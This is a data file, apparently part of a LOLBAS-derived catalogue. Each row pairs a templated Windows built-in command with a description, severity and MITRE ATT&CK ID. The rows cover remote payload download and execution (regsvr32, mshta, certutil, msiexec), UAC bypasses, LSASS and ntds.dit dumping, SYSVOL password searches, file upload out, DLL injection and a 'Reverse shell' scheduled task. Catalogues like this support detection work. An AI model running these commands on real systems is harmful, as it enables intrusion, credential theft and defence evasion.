2250,Windows,dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll},Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.,Execute,Critical,T1543.003,https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
2251,Windows,OneDriveStandaloneUpdater,Download a file from the web address specified in `HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC`. `ODSUUpdateXMLUrlFromOC` and `UpdateXMLUrlFromOC` must be equal to non-empty string values in that same registry key. `UpdateOfficeConfigTimestamp` is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in `%localappdata%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json`.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/
2252,Windows,stordiag.exe,"Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Stordiag/
2253,Windows,makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Makecab/
2254,Windows,makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Makecab/
2255,Windows,makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},Download and compresses the target file and stores it in the target file.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Makecab/
2256,Windows,makecab /F {PATH:.ddf},Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.,Execute,Critical,T1036,https://lolbas-project.github.io/lolbas/Binaries/Makecab/
2257,Windows,diskshadow.exe /s {PATH:.txt},Execute commands using diskshadow.exe from a prepared diskshadow script.,Dump,Medium,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/
2258,Windows,diskshadow> exec {PATH:.exe},Execute commands using diskshadow.exe to spawn child process,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/
2259,Windows,odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},Execute DllRegisterServer from DLL specified.,Execute,Critical,T1218.008,https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
2260,Windows,"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2"" odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""",Install a driver and load the DLL. Requires administrator privileges.,Execute,Critical,T1218.008,https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
2261,Windows,odbcconf -f {PATH:.rsp},Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.,Execute,Critical,T1218.008,https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
2262,Windows,cmdl32 /vpn /lan %cd%\config,"Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where ""X"" denotes a random number or letter.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/cmdl32/
2263,Windows,runexehelper.exe {PATH_ABSOLUTE:.exe},"Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Runexehelper/
2264,Windows,"sftp -o ProxyCommand=""{CMD}"" .",Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Sftp/
2265,Windows,"sftp -D ""{CMD}""",Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Sftp/
2266,Windows,DeviceCredentialDeployment,Grab the console window handle and set it to hidden,Conceal,Medium,T1564,https://lolbas-project.github.io/lolbas/Binaries/DeviceCredentialDeployment/
2267,Windows,InfDefaultInstall.exe {PATH:.inf},Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/
2268,Windows,eventvwr.exe,"During startup, eventvwr.exe checks the registry value `HKCU\Software\Classes\mscfile\shell\open\command` for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/
2269,Windows,"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe","During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\Microsoft\EventV~1\RecentViews` file. This file can be created using https://github.com/pwntester/ysoserial.net",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/
2270,Windows,esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o,Copies the source VBS file to the destination VBS file.,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
2271,Windows,esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o,Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
2272,Windows,esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,Copies the source Alternate Data Stream (ADS) to the destination EXE.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
2273,Windows,esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
2274,Windows,esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,Copies the source EXE to the destination EXE file,Download,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
2275,Windows,esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit},Copies a (locked) file using Volume Shadow Copy,Copy,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
2276,Windows,sigverif.exe,"Launch sigverif.exe GUI, click 'Advanced', specify arbitrary executable path as 'log file name', then click 'View Log' to execute the binary.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Sigverif/
2277,Windows,pcalua.exe -a {PATH:.exe},Open the target .EXE using the Program Compatibility Assistant.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
2278,Windows,pcalua.exe -a {PATH_SMB:.dll},Open the target .DLL file with the Program Compatibilty Assistant.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
2279,Windows,pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,Open the target .CPL file with the Program Compatibility Assistant.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
2280,Windows,"explorer.exe /root,""{PATH_ABSOLUTE:.exe}""",Execute specified .exe with the parent process spawning from a new instance of explorer.exe,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Explorer/
2281,Windows,explorer.exe {PATH_ABSOLUTE:.exe},Execute notepad.exe with the parent process spawning from a new instance of explorer.exe,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Explorer/
2282,Windows,CustomShellHost.exe,Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/
2283,Windows,ngen.exe {REMOTEURL},Downloads payload from remote server using the Microsoft Native Image Generator utility.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Ngen/
2284,Windows,certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe},Download and save an executable to disk in the current folder.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
2285,Windows,certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},"Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>` when not.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
2286,Windows,certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,Download and save a .ps1 file to an Alternate Data Stream (ADS).,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
2287,Windows,certutil.exe -URL {REMOTEURL:.exe},Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
2288,Windows,certutil -encode {PATH} {PATH:.base64},Command to encode a file using Base64,Encode,Low,T1027.013,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
2289,Windows,certutil -decode {PATH:.base64} {PATH},Command to decode a Base64 encoded file.,Decode,Low,T1140,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
2290,Windows,certutil -decodehex {PATH:.hex} {PATH},Command to decode a hexadecimal-encoded file.,Decode,Low,T1140,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
2291,Windows,"ssh localhost ""{CMD}""",Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/ssh/
2292,Windows,"ssh -o ProxyCommand=""{CMD}"" .",Executes specified command from ssh.exe,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/ssh/
2293,Windows,"ssh -o PKCS11Provider=""\\\\127.0.0.1\\Temp\\example.dll"" win@github.com",Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by `ssh.exe`. Note that all backslashes should be escaped (i.e. every `\` should be turned into `\\`).,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/ssh/
2294,Windows,vbc.exe /target:exe {PATH_ABSOLUTE:.vb},Binary file used by .NET to compile Visual Basic code to an executable.,Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/vbc/
2295,Windows,vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},Binary file used by .NET to compile Visual Basic code to an executable.,Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/vbc/
2296,Windows,regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,Execute the specified remote .SCT script with scrobj.dll.,AWL Bypass,Medium,T1218.010,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
2297,Windows,regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll,Execute the specified local .SCT script with scrobj.dll.,AWL Bypass,Medium,T1218.010,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
2298,Windows,regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,Execute the specified remote .SCT script with scrobj.dll.,Execute,Critical,T1218.010,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
2299,Windows,regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll,Execute the specified local .SCT script with scrobj.dll.,Execute,Critical,T1218.010,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
2300,Windows,regsvr32.exe /s {PATH:.dll},Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.,Execute,Critical,T1218.010,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
2301,Windows,regsvr32.exe /u /s {PATH:.dll},Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.,Execute,Critical,T1218.010,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
2302,Windows,MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},Inject evil.dll into a process with PID 3110.,Execute,Critical,T1218.013,https://lolbas-project.github.io/lolbas/Binaries/Mavinject/
2303,Windows,Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll,Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Mavinject/
2304,Windows,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,Execute C# code with the Build Provider and proper folder structure in place.,AWL Bypass,Medium,T1127,https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/
2305,Windows,"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",Create a recurring task to execute every day at a specific time.,Execute,Critical,T1053.002,https://lolbas-project.github.io/lolbas/Binaries/At/
2306,Windows,rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).,Dump,Medium,T1003,https://lolbas-project.github.io/lolbas/Binaries/rdrleakdiag/
2307,Windows,rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).,Dump,High,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/rdrleakdiag/
2308,Windows,rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap,"After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).",Dump,High,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/rdrleakdiag/
2309,Windows,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe"" /activate ""{REMOTEURL}#APPLICATION_METADATA_HERE""",Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen and default AppLocker rules when the application is published as partial trust.,AWL Bypass,Medium,T1127.002,https://lolbas-project.github.io/lolbas/Binaries/Applaunch/
2310,Windows,msbuild.exe {PATH:.xml},Build and execute a C# project stored in the target XML file.,AWL Bypass,Medium,T1127.001,https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
2311,Windows,msbuild.exe {PATH:.csproj},Build and execute a C# project stored in the target csproj file.,Execute,Critical,T1127.001,https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
2312,Windows,"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",Executes generated Logger DLL file with TargetLogger export.,Execute,Critical,T1127.001,https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
2313,Windows,msbuild.exe {PATH:.proj},Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.,Execute,Critical,T1127.001,https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
2314,Windows,msbuild.exe @{PATH:.rsp},By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line.,Execute,Critical,T1036,https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
2315,Windows,wsreset.exe,"During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/Wsreset/
2316,Windows,pnputil.exe -i -a {PATH_ABSOLUTE:.inf},Used for installing drivers,Execute,Critical,T1547,https://lolbas-project.github.io/lolbas/Binaries/Pnputil/
2317,Windows,regsvcs.exe {PATH:.dll},Loads the target .NET DLL file and executes the RegisterClass function.,Execute,Critical,T1218.009,https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
2318,Windows,regsvcs.exe {PATH:.dll},Loads the target .NET DLL file and executes the RegisterClass function.,AWL Bypass,High,T1218.009,https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
2319,Windows,mshta.exe {PATH:.hta},"Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",Execute,Critical,T1218.005,https://lolbas-project.github.io/lolbas/Binaries/Mshta/
2320,Windows,"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.sct}"""")""))",Executes VBScript supplied as a command line argument.,Execute,Critical,T1218.005,https://lolbas-project.github.io/lolbas/Binaries/Mshta/
2321,Windows,"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",Executes JavaScript supplied as a command line argument.,Execute,Critical,T1218.005,https://lolbas-project.github.io/lolbas/Binaries/Mshta/
2322,Windows,"mshta.exe ""{PATH_ABSOLUTE}:file.hta""","Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",ADS,Medium,T1218.005,https://lolbas-project.github.io/lolbas/Binaries/Mshta/
2323,Windows,mshta.exe {REMOTEURL},It will download a remote payload and place it in INetCache.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Mshta/
2324,Windows,replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,Copy .cab file to destination,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Replace/
2325,Windows,replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A,Download/Copy executable to specified folder,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Replace/
2326,Windows,cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat,Add content to an Alternate Data Stream (ADS).,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Cmd/
2327,Windows,cmd.exe - < {PATH}:payload.bat,Execute payload.bat stored in an Alternate Data Stream (ADS).,ADS,Medium,T1059.003,https://lolbas-project.github.io/lolbas/Binaries/Cmd/
2328,Windows,type {PATH_SMB} > {PATH_ABSOLUTE},Downloads a specified file from a WebDAV server to the target file.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Cmd/
2329,Windows,type {PATH_ABSOLUTE} > {PATH_SMB},Uploads a specified file to a WebDAV server.,Upload,Medium,T1048.003,https://lolbas-project.github.io/lolbas/Binaries/Cmd/
2330,Windows,setupugc.exe specialize,"By first setting a command to a specific registry under `Setup-Unattend-Settings`, e.g. via: `reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\UnattendSettings\Setup-Unattend-Settings\RunSynchronous\1"" /v Path /d ""{CMD}"" /f`, executing the following will cause it to execute the command.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/setupugc/
2331,Windows,setupugc.exe auditUser,"Same technique as above, but using the `auditUser` command-line option.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/setupugc/
2332,Windows,xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},Xwizard.exe running a custom class that has been added to the registry.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Xwizard/
2333,Windows,xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Xwizard/
2334,Windows,xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL},"Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Xwizard/
2335,Windows,expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},Copies source file to destination.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Expand/
2336,Windows,expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},Copies source file to destination.,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Expand/
2337,Windows,expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,Copies source file to destination Alternate Data Stream (ADS),ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Expand/
2338,Windows,OfflineScannerShell,Execute mpclient.dll library in the current working directory,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/OfflineScannerShell/
2339,Windows,wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer,Loads and executes DLL code on attach.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/wuauclt/
2340,Windows,runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder},Execute the PowerShell script with .txt extension,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/
2341,Windows,Scriptrunner.exe -appvscript {PATH:.exe},Executes executable,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/
2342,Windows,ScriptRunner.exe -appvscript {PATH_SMB:.cmd},Executes cmd file from remote server,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/
2343,Windows,conhost.exe {CMD},Execute a command line with conhost.exe as parent process,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Conhost/
2344,Windows,conhost.exe --headless {CMD},Execute a command line with conhost.exe as parent process,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Conhost/
2345,Windows,findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe,"Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.",ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Findstr/
2346,Windows,findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,"Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.",ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Findstr/
2347,Windows,findstr /S /I cpassword \\sysvol\policies\*.xml,Search for stored password in Group Policy files stored on SYSVOL.,Credentials,Critical,T1552.001,https://lolbas-project.github.io/lolbas/Binaries/Findstr/
2348,Windows,findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},"Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Findstr/
2349,Windows,msiexec /quiet /i {PATH:.msi},Installs the target .MSI file silently.,Execute,Critical,T1218.007,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
2350,Windows,msiexec /q /i {REMOTEURL},Installs the target remote & renamed .MSI file silently.,Execute,Critical,T1218.007,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
2351,Windows,msiexec /y {PATH_ABSOLUTE:.dll},Calls DllRegisterServer to register the target DLL.,Execute,Critical,T1218.007,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
2352,Windows,msiexec /z {PATH_ABSOLUTE:.dll},Calls DllUnregisterServer to un-register the target DLL.,Execute,Critical,T1218.007,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
2353,Windows,"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb","Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.",Execute,Critical,T1218.007,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
2354,Windows,psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0,"Record a user screen without creating a GUI. You should use ""psr.exe /stop"" to stop recording and create output file.",Reconnaissance,Low,T1113,https://lolbas-project.github.io/lolbas/Binaries/Psr/
2355,Windows,wscript //e:vbscript {PATH}:script.vbs,Execute script stored in an alternate data stream,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Wscript/
2356,Windows,"echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js",Download and execute script stored in an alternate data stream,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Wscript/
2357,Windows,rasautou -d {PATH:.dll} -p export_name -a a -e e,Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Rasautou/
2358,Windows,provlaunch.exe LOLBin,"Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
2359,Windows,wt.exe {CMD},Execute a command via Windows Terminal.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/wt/
2360,Windows,HH.exe {REMOTEURL:.bat},Open the target batch script with HTML Help.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Hh/
2361,Windows,HH.exe {PATH_ABSOLUTE:.exe},Executes specified executable with HTML Help.,Execute,Critical,T1218.001,https://lolbas-project.github.io/lolbas/Binaries/Hh/
2362,Windows,HH.exe {REMOTEURL:.chm},Executes a remote .chm file which can contain commands.,Execute,Critical,T1218.001,https://lolbas-project.github.io/lolbas/Binaries/Hh/
2363,Windows,ilasm.exe {PATH_ABSOLUTE:.txt} /exe,Binary file used by .NET to compile C#/intermediate (IL) code to .exe,Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/Ilasm/
2364,Windows,ilasm.exe {PATH_ABSOLUTE:.txt} /dll,Binary file used by .NET to compile C#/intermediate (IL) code to dll,Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/Ilasm/
2365,Windows,Presentationhost.exe {PATH_ABSOLUTE:.xbap},Executes the target XAML Browser Application (XBAP) file,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/
2366,Windows,Presentationhost.exe {REMOTEURL},It will download a remote payload and place it in INetCache.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/
2367,Windows,"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr ""{CMD}""",Create a recurring task to execute every minute.,Execute,Critical,T1053.005,https://lolbas-project.github.io/lolbas/Binaries/Schtasks/
2368,Windows,"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{CMD}"" /sc daily",Create a scheduled task on a remote computer for persistence/lateral movement,Execute,Critical,T1053.005,https://lolbas-project.github.io/lolbas/Binaries/Schtasks/
2369,Windows,ie4uinit.exe -BaseSettings,Executes commands from a specially prepared ie4uinit.inf file.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/
2370,Windows,CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt},Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/CertReq/
2371,Windows,CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE},Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.,Upload,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/CertReq/
2372,Windows,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},msedge_proxy will download malicious file.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/
2373,Windows,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",msedge_proxy.exe will execute file in the background,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/
2374,Windows,regasm.exe {PATH:.dll},Loads the target .NET DLL file and executes the RegisterClass function.,AWL Bypass,High,T1218.009,https://lolbas-project.github.io/lolbas/Binaries/Regasm/
2375,Windows,regasm.exe /U {PATH:.dll},Loads the target .DLL file and executes the UnRegisterClass function.,Execute,Critical,T1218.009,https://lolbas-project.github.io/lolbas/Binaries/Regasm/
2376,Windows,wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe},Execute executable with wlrmdr.exe as parent process,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Wlrmdr/
2377,Windows,diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Diantz/
